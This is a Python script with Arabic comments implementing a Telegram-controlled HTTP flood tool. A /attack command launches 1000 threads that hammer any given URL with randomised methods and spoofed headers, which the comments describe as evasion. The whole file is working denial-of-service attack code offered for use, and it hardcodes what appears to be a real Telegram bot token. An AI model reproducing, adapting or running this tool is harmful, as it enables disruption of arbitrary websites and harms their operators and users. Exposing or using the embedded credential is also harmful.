import requests
import random
import time
import threading
import telebot
from fake_useragent import UserAgent

# إعدادات الهجوم
MAX_THREADS = 1000  # عدد أقل لتفادي حظر IP
REQUEST_TIMEOUT = 5
RETRY_DELAY = 0.1
REPORT_INTERVAL = 1000

# متغيرات التحكم
stop_attack = False
request_count = 0
ua = UserAgent()

class AdvancedRequestAttack:
    def __init__(self, target, bot, chat_id):
        self.target = target
        self.bot = bot
        self.chat_id = chat_id
        self.proxies = self.load_proxies()  # قم بتحميل قائمة بروكسي إذا لديك
        
    def generate_headers(self):
        """إنشاء رؤوس HTTP متغيرة باستمرار"""
        return {
            'User-Agent': ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'ar;q=0.8', 'fr;q=0.7']),
            'Connection': random.choice(['keep-alive', 'close']),
            'Referer': random.choice([
                'https://www.google.com/',
                'https://www.facebook.com/',
                'https://twitter.com/'
            ]),
            'X-Requested-With': random.choice(['XMLHttpRequest', 'None'])
        }
    
    def send_advanced_request(self):
        """إرسال طلبات متقدمة مع تقنيات التخفي"""
        global request_count, stop_attack
        while not stop_attack:
            try:
                # تقنية تغيير نمط الطلب
                method = random.choice(['GET', 'POST', 'HEAD', 'PUT'])
                
                if method == 'POST':
                    requests.post(
                        self.target,
                        headers=self.generate_headers(),
                        data={'random': random.randint(1, 10000)},
                        timeout=REQUEST_TIMEOUT
                    )
                else:
                    requests.request(
                        method,
                        self.target,
                        headers=self.generate_headers(),
                        timeout=REQUEST_TIMEOUT
                    )
                
                request_count += 1
                
                # تقارير الأداء
                if request_count % REPORT_INTERVAL == 0:
                    self.send_report()
                
                time.sleep(RETRY_DELAY)
                
            except:
                continue
    
    def send_report(self):
        """إرسال تقرير الأداء"""
        report = f"📊 الطلبات المرسلة: {request_count}"
        self.bot.send_message(self.chat_id, report)
    
    def start_attack(self):
        """بدء الهجوم"""
        threads = []
        for _ in range(MAX_THREADS):
            t = threading.Thread(target=self.send_advanced_request)
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()

# إعداد بوت التليجرام
bot = telebot.TeleBot("7248287448:AAFQcPnXrEaNaIFM-Lx_3VizIiv_9glWXCA")

@bot.message_handler(commands=['start'])
def handle_start(message):
    bot.reply_to(message, "🔧 نظام الهجوم المتقدم\n"
                         "/attack [رابط] - بدء الهجوم\n"
                         "/stop - إيقاف الهجوم")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global stop_attack, request_count
    try:
        target = message.text.split()[1]
        if not target.startswith(('http://', 'https://')):
            bot.reply_to(message, "⚠ يجب أن يبدأ الرابط بـ http:// أو https://")
            return
        
        stop_attack = False
        request_count = 0
        
        bot.reply_to(message, f"🚀 بدء الهجوم على {target}")
        attack = AdvancedRequestAttack(target, bot, message.chat.id)
        
        # تشغيل الهجوم في خيط منفصل
        attack_thread = threading.Thread(target=attack.start_attack)
        attack_thread.start()
        
    except IndexError:
        bot.reply_to(message, "⚙ الاستخدام: /attack [رابط]")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global stop_attack
    stop_attack = True
    bot.reply_to(message, "🛑 تم إيقاف الهجوم بنجاح")

if __name__ == "__main__":
    bot.polling(none_stop=True)
